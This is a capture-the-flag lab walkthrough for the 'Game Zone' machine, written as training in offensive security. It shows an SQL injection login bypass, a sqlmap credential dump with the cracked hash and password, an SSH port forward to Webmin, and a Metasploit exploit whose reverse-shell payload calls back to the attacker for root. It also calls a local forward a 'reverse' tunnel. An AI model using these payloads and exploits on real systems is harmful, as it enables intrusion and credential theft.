# Game Zone

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!  

## Tools  

- Burpsuite
- SQLMap
- John The Ripper
- Metasploit

## Obtain Access via SQLi

Scan anyway: 
`:> nmap -Pn -p- <Target IP>`

```md
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-09 23:47 GMT
Nmap scan report for 10.66.188.57
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

The login form has commonly named fields "Username" and "Password".  

![Login](/assets/game-zone-101.png)  

Setting the username field to `' or 1=1 -- -` and leave the password field blank, and the login will be successful.  

![redirect](/assets/game-zone-102.png)  

## Using SQLMap

Open Burpsuite  
Open the built-in browser  
Use the previously identified SQLi to log into the site with Burp Suite's browser.  
Perform the search for "GameZone"  to intercept the request: 

```md
POST /portal.php HTTP/1.1
Host: 10.66.188.57
Content-Length: 19
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.66.188.57
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.66.188.57/portal.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nlpq716chiq3fs6u70r11t2c42
Connection: keep-alive

searchitem=GameZone
```
Save the request to a text file 

Use SQLMap to dump credentials using the authenticated session cookie

`:> sqlmap -r request.txt --dbms=mysql --dump`

When requested, save the output to temporary file. 

Read the contents of the temporary file to identify the hashed password

`:> cat /tmp/sqlmapm6awr6n411939/sqlmaphashes-cr1e3_sh.txt`  
`agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`  

SQLMap is able to use the rockyou.txt file to crack the password. 

Save the password to the a text file on the desktop.  

Upon completion of processing, the table will be dumped and the name of the table will be revealed.

## Cracking a Password with JohnTheRipper  

The format of the password is given in the processing text.  

`:> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`  

Use SSH to log into the server: `:> ssh agent47@<Target IP>`  

The flag file is immediately available.  

## Exposing services with reverse SSH Tunnels

### Overview  

Attacker's local meachine establishes the secure shell connection to the remote device.  
The Attacker specifies that traffic on specific ports of the remote target to forward traffic on that port to a specific port on the attacking device.  

Establish a connection from the remote machine to the local machine: ssh -L [local_port]:[remote_host]:[remote_port] [remote_server_user]@[remote_server_address]


On the remote device, identify open sockets.  

`:> ss -tupln` where  

- t	Display TCP sockets
- u	Display UDP sockets
- l	Displays only listening sockets
- p	Shows the process using the socket
- n	Doesn't resolve service names  

![Listening](/assets/game-zone-104.png)  

Port 10000 is listening but didn't show up on the initial nmap scan, indicating there is a rule blocking the port.  

Forward port 10000 on the remote device to port 10000 on the local device.

From the local (attacking) device:

`:> ssh -L 7468:localhost:10000 agent47@<target IP>`  

Enter agent47 password when requested  

point the browser on the local machine to localhost:7468

![Reverse Shell](/assets/game-zone-105.png)  

Log in with the known credentials..  

![logged in](/assets/game-zone-106.png)

## Privileges Excalation with Metasploit  

`:> msfconsole` to start the metasploit framework  

Search for the webmin service.

`:> show options`  

```md
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                        sploit/basics/using-metasploit.html
   RPORT     7468             yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.66.127.146    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

Note the RHOST is the loopback becase the reverse ssh was set up earlier.  
identify a payload. The common default is cmd/unix/reverse

`:> set PAYLOAD cmd/unix/reverse`

`:> run` 

the result in a simple shell. Navigate to find the root flag.